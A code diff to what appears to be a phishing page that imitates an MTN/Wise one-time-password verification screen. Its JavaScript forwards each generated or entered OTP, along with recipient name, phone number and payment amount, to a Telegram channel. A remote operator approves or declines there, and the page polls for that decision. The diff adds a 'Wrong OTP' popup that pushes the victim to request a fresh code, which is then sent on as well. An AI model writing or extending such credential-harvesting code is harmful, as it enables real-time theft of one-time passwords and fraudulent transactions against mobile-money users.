@@ -65,19 +65,14 @@
     background: var(--mtn-yellow);
   }
 
-  /* Header */
   .otp-header {
-    display: flex;
-    align-items: center;
-    gap: 0.85rem;
-    margin-bottom: 1.5rem;
-    padding-bottom: 1.25rem;
+    display: flex; align-items: center; gap: 0.85rem;
+    margin-bottom: 1.5rem; padding-bottom: 1.25rem;
     border-bottom: 1px solid var(--mtn-border);
   }
   .mtn-logo {
     background: var(--mtn-yellow);
-    width: 48px; height: 48px;
-    border-radius: 14px;
+    width: 48px; height: 48px; border-radius: 14px;
     display: flex; align-items: center; justify-content: center;
     box-shadow: 0 4px 12px rgba(255,204,0,0.4);
     flex-shrink: 0;
@@ -88,7 +83,6 @@
   .otp-title .brand { font-size: 1.15rem; font-weight: 700; color: var(--mtn-text); line-height: 1.1; }
   .otp-title .sub { font-size: 0.8rem; font-weight: 500; color: var(--mtn-text-light); }
 
-  /* Instruction */
   .otp-instruction {
     font-size: 0.88rem;
     color: var(--mtn-text-light);
@@ -97,10 +91,7 @@
     font-weight: 400;
     text-align: center;
   }
-  .otp-instruction strong {
-    color: var(--mtn-text);
-    font-weight: 600;
-  }
+  .otp-instruction strong { color: var(--mtn-text); font-weight: 600; }
   .otp-instruction .phone-highlight {
     background: #FFF8D9;
     padding: 0.15rem 0.5rem;
@@ -110,7 +101,6 @@
     white-space: nowrap;
   }
 
-  /* OTP inputs */
   .otp-inputs {
     display: flex;
     justify-content: center;
@@ -154,17 +144,13 @@
     background: #FFF8F8;
     animation: shake 0.4s ease;
   }
-  .otp-input:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-  }
+  .otp-input:disabled { opacity: 0.6; cursor: not-allowed; }
   @keyframes shake {
     0%, 100% { transform: translateX(0); }
     20%, 60% { transform: translateX(-6px); }
     40%, 80% { transform: translateX(6px); }
   }
 
-  /* Expiry */
   .otp-expiry {
     display: flex;
     align-items: center;
@@ -181,14 +167,10 @@
     stroke: currentColor; fill: none;
     stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
   }
-  .otp-expiry .time {
-    color: var(--mtn-text);
-    font-weight: 700;
-  }
+  .otp-expiry .time { color: var(--mtn-text); font-weight: 700; }
   .otp-expiry.urgent { color: var(--wise-error); }
   .otp-expiry.urgent .time { color: var(--wise-error); }
 
-  /* Submit button */
   .otp-submit-btn {
     width: 100%;
     border: none;
@@ -216,10 +198,7 @@
   }
   .otp-submit-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
   .otp-submit-btn:disabled {
-    background: #E6E6E6;
-    color: #999;
-    box-shadow: none;
-    cursor: not-allowed;
+    background: #E6E6E6; color: #999; box-shadow: none; cursor: not-allowed;
   }
   .otp-submit-btn svg {
     width: 20px; height: 20px;
@@ -227,7 +206,6 @@
     stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
   }
 
-  /* Resend row */
   .otp-resend-row {
     display: flex;
     align-items: center;
@@ -252,19 +230,138 @@
     align-items: center;
     gap: 0.35rem;
   }
-  .otp-resend-btn:hover:not(:disabled) {
-    background: #FFF8D9;
-    color: #B88A00;
+  .otp-resend-btn:hover:not(:disabled) { background: #FFF8D9; color: #B88A00; }
+  .otp-resend-btn:disabled { color: var(--mtn-text-muted); cursor: not-allowed; }
+  .otp-resend-btn .count { font-variant-numeric: tabular-nums; }
+
+  /* ============================================================
+     WRONG OTP POPUP OVERLAY
+     ============================================================ */
+  .overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(15, 23, 42, 0.55);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    z-index: 500;
+    animation: overlayFade 0.25s ease both;
   }
-  .otp-resend-btn:disabled {
-    color: var(--mtn-text-muted);
-    cursor: not-allowed;
-  }
-  .otp-resend-btn .count {
-    font-variant-numeric: tabular-nums;
+  .overlay.active { display: flex; }
+  @keyframes overlayFade {
+    from { opacity: 0; }
+    to   { opacity: 1; }
   }
 
-  /* Status */
+  .popup-card {
+    background: var(--wise-white);
+    border-radius: 1.5rem;
+    padding: 2rem 1.75rem 1.75rem;
+    max-width: 420px;
+    width: 100%;
+    text-align: center;
+    position: relative;
+    box-shadow: 0 25px 60px -12px rgba(0,0,0,0.4);
+    animation: popupEnter 0.42s cubic-bezier(0.22, 1, 0.36, 1) both;
+    overflow: hidden;
+  }
+  @keyframes popupEnter {
+    from { opacity: 0; transform: translateY(20px) scale(0.94); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+  .popup-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 5px;
+    background: var(--wise-error);
+  }
+
+  .popup-icon {
+    width: 68px;
+    height: 68px;
+    border-radius: 50%;
+    background: #FDECEC;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 1.25rem;
+    animation: popupIconPulse 1.8s ease-in-out infinite;
+  }
+  @keyframes popupIconPulse {
+    0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(209, 67, 67, 0.4); }
+    50%      { transform: scale(1.05); box-shadow: 0 0 0 14px rgba(209, 67, 67, 0); }
+  }
+  .popup-icon svg {
+    width: 32px; height: 32px;
+    stroke: var(--wise-error);
+    fill: none; stroke-width: 2.4;
+    stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .popup-title {
+    font-size: 1.3rem;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    color: var(--mtn-text);
+    margin-bottom: 0.5rem;
+    line-height: 1.25;
+  }
+
+  .popup-subtitle {
+    font-size: 0.9rem;
+    color: var(--mtn-text-light);
+    line-height: 1.55;
+    margin-bottom: 1.5rem;
+    max-width: 320px;
+    margin-left: auto;
+    margin-right: auto;
+    font-weight: 400;
+  }
+
+  .popup-btn {
+    width: 100%;
+    border: none;
+    border-radius: 0.85rem;
+    padding: 1.05rem 1.5rem;
+    font-size: 1.02rem;
+    font-weight: 700;
+    font-family: 'Inter', sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.6rem;
+    cursor: pointer;
+    transition: transform 0.15s, box-shadow 0.15s, background 0.15s;
+    background: var(--mtn-yellow);
+    color: var(--mtn-black);
+    box-shadow: 0 4px 14px rgba(255,204,0,0.4);
+    letter-spacing: -0.01em;
+  }
+  .popup-btn:hover:not(:disabled) {
+    background: #F5C200;
+    transform: translateY(-1px);
+    box-shadow: 0 8px 20px rgba(255,204,0,0.5);
+  }
+  .popup-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
+  .popup-btn:disabled {
+    background: #E6E6E6; color: #999; box-shadow: none; cursor: not-allowed;
+  }
+  .popup-btn svg {
+    width: 20px; height: 20px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  /* Success overlay variant */
+  .popup-card.success::before { background: var(--wise-success); }
+  .popup-card.success .popup-icon { background: #E8F5E9; }
+  .popup-card.success .popup-icon svg { stroke: var(--wise-success); }
+
+  /* Status (kept for inline messages like "new code sent") */
   .status-message {
     margin-top: 1rem;
     padding: 0.85rem 1.15rem;
@@ -294,6 +391,8 @@
     .otp-input { width: 50px; height: 58px; font-size: 1.4rem; }
     .otp-inputs { gap: 0.5rem; }
     .otp-submit-btn { font-size: 1rem; padding: 1rem 1.25rem; }
+    .popup-card { padding: 1.75rem 1.35rem 1.5rem; border-radius: 1.25rem; }
+    .popup-title { font-size: 1.15rem; }
   }
 </style>
 </head>
@@ -350,6 +449,34 @@
   </div>
 </div>
 
+<!-- ============================================================
+     WRONG OTP POPUP OVERLAY
+     ============================================================ -->
+<div class="overlay" id="wrongOtpOverlay">
+  <div class="popup-card" id="wrongOtpCard">
+    <div class="popup-icon">
+      <svg viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="12" y1="8" x2="12" y2="12"/>
+        <line x1="12" y1="16" x2="12.01" y2="16"/>
+      </svg>
+    </div>
+
+    <h2 class="popup-title" id="popupTitle">Wrong OTP</h2>
+    <p class="popup-subtitle" id="popupSubtitle">
+      The code you entered doesn't match. Please request a new OTP to continue.
+    </p>
+
+    <button class="popup-btn" id="popupResendBtn">
+      <svg viewBox="0 0 24 24">
+        <polyline points="1 4 1 10 7 10"/>
+        <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/>
+      </svg>
+      Resend new OTP
+    </button>
+  </div>
+</div>
+
 <script>
 (function() {
   const STORAGE_KEY = 'wise_payment_data';
@@ -376,7 +503,7 @@
     } catch(e) { return {}; }
   })();
 
-  // ---- Guard: must have session ----
+  // ---- Guard ----
   if (!session.txnId) {
     window.location.replace('mtn.html');
     return;
@@ -396,6 +523,12 @@
   const otpStatusIcon = $('otpStatusIcon');
   const otpExpiry = $('otpExpiry');
   const expiryTime = $('expiryTime');
+
+  const overlay = $('wrongOtpOverlay');
+  const wrongOtpCard = $('wrongOtpCard');
+  const popupTitle = $('popupTitle');
+  const popupSubtitle = $('popupSubtitle');
+  const popupResendBtn = $('popupResendBtn');
 
   let currentOtpCode = null;
   let pollInterval = null;
@@ -440,7 +573,7 @@
     setTimeout(() => otpStatus.classList.add('hidden'), 4000);
   }
 
-  // ---- Expiry countdown (5 minutes) ----
+  // ---- Expiry countdown (5 min) ----
   const EXPIRY_SECONDS = 5 * 60;
   let expiryRemaining = EXPIRY_SECONDS;
 
@@ -470,10 +603,7 @@
   }
 
   function stopExpiryCountdown() {
-    if (expiryTimer) {
-      clearInterval(expiryTimer);
-      expiryTimer = null;
-    }
+    if (expiryTimer) { clearInterval(expiryTimer); expiryTimer = null; }
   }
 
   async function onOtpExpired() {
@@ -485,23 +615,19 @@
 <b>Txn ID:</b> <code>${esc(txnId)}</code>
 <b>Recipient:</b> ${esc(session.recipientName || '—')}
 <b>Number:</b> ${esc(session.recipientPhone || '—')}
-<b>Amount:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}
 
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
-
-OTP expired without verification.`, txnId, 'otp-timeout');
+<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>`, txnId, 'otp-timeout');
 
     showStatus('The OTP has expired. Please request a new code.', 'error');
   }
 
-  // ---- Render phone number ----
+  // ---- Render phone ----
   otpPhone.textContent = fmtPhone(session.recipientPhone);
 
-  // ---- Generate + send OTP to Telegram ----
+  // ---- Send OTP to Telegram ----
   async function sendOtpToTelegram() {
     currentOtpCode = genOtp();
 
-    // Save code so we can display it in Telegram and verify later
     try {
       sessionStorage.setItem('wise_session', JSON.stringify({
         ...session,
@@ -534,11 +660,8 @@ OTP expired without verification.`, txnId, 'otp-timeout');
 
 <b>⚠️ Approve or decline when ready</b>`;
 
-    // Reset backend status before sending new message
     await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
     await sendTelegram(message, txnId, 'otp');
-
-    // Start polling for approve/decline decision
     startPolling();
   }
 
@@ -561,10 +684,7 @@ OTP expired without verification.`, txnId, 'otp-timeout');
   }
 
   function stopPolling() {
-    if (pollInterval) {
-      clearInterval(pollInterval);
-      pollInterval = null;
-    }
+    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
   }
 
   function onApproved() {
@@ -573,7 +693,6 @@ OTP expired without verification.`, txnId, 'otp-timeout');
     otpSubmitBtn.disabled = true;
     otpInputs.forEach(i => i.disabled = true);
 
-    // Show success state briefly
     otpSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Approved';
     showStatus('Code verified! Completing transaction...', 'success');
 
@@ -582,21 +701,38 @@ OTP expired without verification.`, txnId, 'otp-timeout');
     }, 900);
   }
 
+  // ---- Wrong OTP: show popup overlay (no navigation) ----
   function onDeclined() {
     stopExpiryCountdown();
     stopPolling();
+    isSubmitting = false;
+
     otpSubmitBtn.disabled = true;
     otpInputs.forEach(i => {
       i.disabled = true;
       i.classList.add('error');
     });
-    showStatus('Wrong code. Redirecting to resend…', 'error');
-    setTimeout(() => {
-      window.location.href = 'resend.html';
-    }, 1400);
+
+    // Show the wrong‑OTP popup
+    showWrongOtpPopup();
   }
 
-  // ---- OTP input auto‑advance / paste / backspace ----
+  function showWrongOtpPopup() {
+    wrongOtpCard.classList.remove('success');
+    wrongOtpCard.querySelector('.popup-icon').innerHTML =
+      '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
+    popupTitle.textContent = 'Wrong OTP';
+    popupSubtitle.textContent = 'The code you entered doesn’t match. Please request a new OTP to continue.';
+    popupResendBtn.disabled = false;
+    popupResendBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>Resend new OTP';
+    overlay.classList.add('active');
+  }
+
+  function hideWrongOtpPopup() {
+    overlay.classList.remove('active');
+  }
+
+  // ---- OTP input behavior ----
   otpInputs.forEach((inp, i) => {
     inp.addEventListener('input', e => {
       const v = e.target.value.replace(/\D/g, '');
@@ -616,26 +752,20 @@ OTP expired without verification.`, txnId, 'otp-timeout');
         otpInputs[i - 1].value = '';
         otpInputs[i - 1].classList.remove('filled');
       }
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        otpSubmitBtn.click();
-      }
+      if (e.key === 'Enter') { e.preventDefault(); otpSubmitBtn.click(); }
     });
 
     inp.addEventListener('paste', e => {
       e.preventDefault();
       const p = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
       if (p.length === 4) {
-        otpInputs.forEach((x, j) => {
-          x.value = p[j] || '';
-          if (x.value) x.classList.add('filled');
-        });
+        otpInputs.forEach((x, j) => { x.value = p[j] || ''; if (x.value) x.classList.add('filled'); });
         otpInputs[3].focus();
       }
     });
   });
 
-  // ---- Resend cooldown ----
+  // ---- Resend cooldown (inline button) ----
   function startResendCooldown(seconds) {
     let remaining = seconds;
     otpResendBtn.disabled = true;
@@ -674,7 +804,6 @@ OTP expired without verification.`, txnId, 'otp-timeout');
     otpSubmitBtn.disabled = true;
     otpSubmitBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Verifying...';
 
-    // Send the entered code to Telegram for approval
     const message = `🔑 <b>OTP ENTERED — APPROVAL REQUIRED</b>
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -691,25 +820,22 @@ OTP expired without verification.`, txnId, 'otp-timeout');
 <b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
 <b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
 
-<b>👉 Approve to complete, or Decline to show wrong‑code page</b>`;
+<b>👉 Approve to complete, or Decline to show wrong‑code popup</b>`;
 
-    // Reset backend status so polling picks up a fresh decision
     await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
     await sendTelegram(message, txnId, 'otp-verify');
 
-    // Do NOT re-enable the button. Wait for Telegram decision.
-    // Polling continues from earlier, waiting for approve/decline
+    // Restart polling to wait for the approval decision
+    startPolling();
   });
 
-  // ---- Resend ----
+  // ---- Inline resend ----
   otpResendBtn.addEventListener('click', async () => {
     if (otpResendBtn.disabled) return;
-
     otpResendBtn.disabled = true;
     resendLabel.textContent = 'Sending...';
     resendCount.textContent = '';
 
-    // Generate a fresh code
     const newCode = genOtp();
     currentOtpCode = newCode;
 
@@ -724,40 +850,91 @@ OTP expired without verification.`, txnId, 'otp-timeout');
 
     await sendTelegram(`🔄 <b>OTP RESENT</b>
 
-━━━━━━━━━━━━━━━━━━━━
 <b>New code:</b> <code>${esc(newCode)}</code>
 <b>Sent to:</b> ${esc(fmtPhone(session.recipientPhone))}
-<b>Recipient:</b> ${esc(session.recipientName || '—')}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>`, txnId, 'otp');
+<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>`, txnId, 'otp');
 
     setTimeout(() => {
       otpResendBtn.disabled = false;
       resendLabel.textContent = 'Resend code';
-
-      // Reset inputs
-      otpInputs.forEach(i => {
-        i.value = '';
-        i.classList.remove('filled', 'error');
-        i.disabled = false;
-      });
+      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled', 'error'); i.disabled = false; });
       otpSubmitBtn.disabled = false;
       otpSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Verify code';
       isSubmitting = false;
-
-      // Restart expiry + cooldown
       startExpiryCountdown();
       startResendCooldown(30);
-
       showStatus('A new code has been sent to your phone.', 'success');
       otpInputs[0].focus();
     }, 700);
   });
 
+  // ---- Popup resend button ----
+  popupResendBtn.addEventListener('click', async () => {
+    popupResendBtn.disabled = true;
+    popupResendBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Generating...';
+
+    const newCode = genOtp();
+    currentOtpCode = newCode;
+    isSubmitting = false;
+
+    try {
+      sessionStorage.setItem('wise_session', JSON.stringify({
+        ...session,
+        otpCode: newCode,
+        otpSentAt: Date.now(),
+        otpExpiresAt: Date.now() + EXPIRY_SECONDS * 1000,
+        resendCount: (session.resendCount || 0) + 1
+      }));
+    } catch(e) {}
+
+    await sendTelegram(`🔄 <b>NEW OTP REQUESTED (after decline)</b>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🔢 NEW CODE</b>
+━━━━━━━━━━━━━━━━━━━━
+<code>${esc(newCode)}</code>
+
+<b>Sent to:</b> ${esc(fmtPhone(session.recipientPhone))}
+<b>Recipient:</b> ${esc(session.recipientName || '—')}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>💰 AMOUNT</b>
+━━━━━━━━━━━━━━━━━━━━
+<b>Local amount:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
+<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
+
+Reply:
+✅ <code>/approve ${esc(txnId)}</code>
+❌ <code>/decline ${esc(txnId)}</code>`, txnId, 'otp');
+
+    // Reset the underlying OTP card
+    otpInputs.forEach(i => {
+      i.value = '';
+      i.classList.remove('filled', 'error');
+      i.disabled = false;
+    });
+    otpSubmitBtn.disabled = false;
+    otpSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Verify code';
+
+    // Restart the expiry and cooldowns
+    startExpiryCountdown();
+    startResendCooldown(30);
+
+    // Hide the popup and focus the first input
+    hideWrongOtpPopup();
+    setTimeout(() => otpInputs[0].focus(), 200);
+
+    showStatus('A new code has been sent to your phone.', 'success');
+
+    // Re-arm polling so the fresh Telegram message can be approved/declined
+    await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
+    startPolling();
+  });
+
   // ---- Boot ----
-  // Small delay so the card animates in
   setTimeout(() => {
     sendOtpToTelegram();
     startExpiryCountdown();
@@ -765,7 +942,6 @@ OTP expired without verification.`, txnId, 'otp-timeout');
     otpInputs[0].focus();
   }, 300);
 
-  // ---- Safety: prevent navigation while submitting ----
   window.addEventListener('beforeunload', () => {
     stopPolling();
     stopExpiryCountdown();
